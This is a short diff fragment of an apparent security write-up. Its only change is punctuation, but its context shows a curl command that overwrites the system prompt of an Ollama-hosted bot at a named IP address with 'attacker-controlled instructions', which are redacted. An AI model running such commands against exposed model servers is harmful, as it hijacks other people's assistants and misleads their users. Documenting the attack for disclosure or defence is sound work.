@@ -111,7 +111,7 @@ curl -X POST http://85.122.129.248:11434/api/create \
   -d '{
     "model": "rdv-bot:latest",
     "from": "rdv-bot:latest",
-    "system": "[redacted — attacker-controlled instructions]"
+    "system": "[redacted - attacker-controlled instructions]"
   }'
 ```
 
